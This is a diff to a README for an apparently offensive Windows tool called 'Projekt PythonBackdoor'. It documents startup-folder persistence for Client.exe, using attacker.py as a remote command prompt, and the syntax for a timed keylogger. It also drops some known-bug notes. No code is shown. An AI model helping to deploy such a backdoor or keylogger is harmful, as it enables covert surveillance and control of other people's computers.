@@ -23,8 +23,7 @@
 - Client.exe will run on startup if located in %appdata%\microsoft\windows\start menu\programs\startup
 - Do not close the server and rerun
 - In attacker.py use as a normal CMD
-- If you want to use the keylogger make a kl.txt file and type "kl" in attacket.py keystrokes will be stored in kl.txt
-- **kl wont close until client has restarted**!
+- Keylogger syntax ```kl <time in seconds>``` kl will log keys for that amount of time
 
 # Info about Projekt PythonBackdoor
 - Only for Windows!
@@ -36,6 +35,4 @@
 
 **Known Bugs**
 - When server restarts more than once client wont attempt to reconnect
-- "kl close" command doesnt work
-- 
   
